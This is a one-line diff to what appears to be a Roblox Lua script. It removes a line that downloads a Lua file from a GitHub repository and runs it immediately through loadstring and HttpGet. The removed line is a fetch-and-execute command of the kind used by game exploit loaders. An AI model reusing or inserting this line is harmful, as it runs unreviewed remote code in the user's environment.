@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/FortniteGamer696/sword-thing/main/.lua'))()
